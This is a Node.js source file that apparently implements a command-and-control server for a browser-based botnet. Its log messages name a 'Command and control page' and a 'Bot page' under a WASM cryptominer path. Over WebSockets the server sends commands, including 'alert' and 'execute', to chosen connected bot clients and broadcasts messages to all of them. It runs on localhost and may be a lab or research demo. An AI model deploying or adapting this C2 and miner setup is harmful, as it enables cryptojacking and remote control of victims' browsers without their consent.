// WebSocket code based on code from https://gist.github.com/martinsik/2031681

"use strict";

const express = require('express')
const serveIndex = require('serve-index');
const app = express()
const webSocketServer = require('websocket').server;
const http = require('http');

const port = 42001
const webSocketsServerPort = 13347; // port websocket server listens on

// global variables
var history = [ ]; // latest 100 messages
var clients = [ ]; // list of currently connected clients (users)

app.use('/', serveIndex(__dirname + '/wasm'));
app.use(express.static(__dirname + "/wasm"));

app.listen(port, () => {
    dateLog(`web server listening on port ${port}; check http:\/\/localhost:${port}/`);
    dateLog("Command and control page: http://localhost:"+port+"/commandandcontrol.html");
    dateLog("Bot page: http://localhost:"+port+"/wasm-miner/local-miner/miner_plus_bot.html");
})

function dateLog(str) {
    console.log((new Date()) + " " + str);
}

// start HTTP server
var server = http.createServer(function(request, response) {
    // do nothing but listen with HTTP server
    // websocket will handle requests    
}).listen(webSocketsServerPort, function() {
    dateLog("websocket server is listening on port " + webSocketsServerPort);
});
    

// start WebSocket server
var wsServer = new webSocketServer({
    // WebSocket server is tied to a HTTP server. WebSocket request is just
    // an enhanced HTTP request. For more info http://tools.ietf.org/html/rfc6455#page-6
    httpServer: server
});

// called when request received by WebSocket server
wsServer.on('request', function(request) {

    var connection = request.accept(null, request.origin); 
    var index = clients.push(connection) - 1;
    var firstMessageReceived = false;
    var remoteAddr = connection.remoteAddress
    var origin = request.origin

    dateLog('Accepted connection from '+remoteAddr+' (origin ' + origin+')');

    // send back chat history
    if (history.length > 0) {
        connection.sendUTF(JSON.stringify( { type: 'history', data: history} ));
    }

    // user sent some message
    connection.on('message', function(message) {
        if (message.type !== 'utf8') { // accept only text
            return;
        }

        if (firstMessageReceived === false) { // first message sent by user is their name
            firstMessageReceived = true;
            connection.sendUTF(JSON.stringify({ type:'ok', id:index })); // tell them their index
            dateLog('User from '+remoteAddr+' is known as: ' + index);
            var msgObj = logMessage(index, "I have joined the network.");
            broadcastMessage(msgObj);
            return;
        }

        dateLog('Received message from '+ index + ': ' + message.utf8Data);
                
        // keep history of all sent messages
        message = message.utf8Data;
        var msgObj = logMessage(index, message);

        // process the command if it's a command
        var firstWord = getFirstWord(msgObj.text);
        if (firstWord == 'command') {
            processCommand(msgObj);
            return;
        }

        // broadcast message to all connected clients
        broadcastMessage(msgObj);
    });

    function processCommand(msgObj) {
        var text = msgObj.text;
        var command = text.split(" ");
        var argCount = command.length-1;

        if (argCount == 0) {
            sendCommandHelp(index);
            return;
        }

        if (argCount == 2) {
            if (command[2] === 'sayhi') {
                dateLog("Directing "+command[1]+" to SAYHI");
                sendSayHi(command[1]);
                return;
            }            
        }

        if (argCount >= 3) {
            var target = command[1];
            var fullcommand = text.substr(text.indexOf(command[2]));
            var message = text.substr(text.indexOf(command[3]));

            var obj = {
                time: (new Date()).getTime(),
                text: fullcommand,
                author: "cnc",
            };
            
            switch (command[2]) {
                case 'say':
                case 'echotoconsole':
                case 'alert':
                case 'execute':
                    dateLog("Directing "+target+" to "+fullcommand);
                    singlecastCommand(obj, target);
                    return;
                default:
                    return;

            }
        }
    }

    function getFirstWord(msgText) {
        return msgText.split(" ", 1)
    }

    function sendSayHi(destination_index) {
        var data = "sayhi";

        var obj = {
            time: (new Date()).getTime(),
            text: data,
            author: "cnc",
        };

        singlecastCommand(obj, destination_index);
    }

    function sendCommandHelp(destination_index) {
        var data = "Commands:\n" 
                 + " { <source> sayhi }, \n"
                 + " { <source> say <message> }, \n"
                 + " { <source> echotoconsole <message> }, \n"
                 + " { <source> alert <message> }\n";

        var obj = {
            time: (new Date()).getTime(),
            text: data,
            author: "cnc",
        };

        singlecastMessage(obj, index);
    }

    function singlecastCommand(msgObj, destination) {
        var json = JSON.stringify({ type:'command', data: msgObj });
        clients[destination].sendUTF(json);
    }

    function singlecastMessage(msgObj, destination) {
        var json = JSON.stringify({ type:'message', data: msgObj });
        clients[destination].sendUTF(json);
    }

    function broadcastMessage(msgObj) {
        var json = JSON.stringify({ type:'message', data: msgObj });
        for (var i=0; i < clients.length; i++) {
            clients[i].sendUTF(json);
        }
    }

    function logMessage(userName, message) {
        var obj = {
            time: (new Date()).getTime(),
            text: message,
            author: index,
        };
        history.push(obj);
        history = history.slice(-100);
        return obj
    }    

    // user disconnected
    connection.on('close', function(connection) {
        if (index != -1) {
            dateLog("Peer "+ index + " ("+remoteAddr+") disconnected.");
            clients.splice(index, 1); // remove user from the list of connected clients
            var msgObj = logMessage(index, "I have left the network.");
            broadcastMessage(msgObj);
        }
    });

});

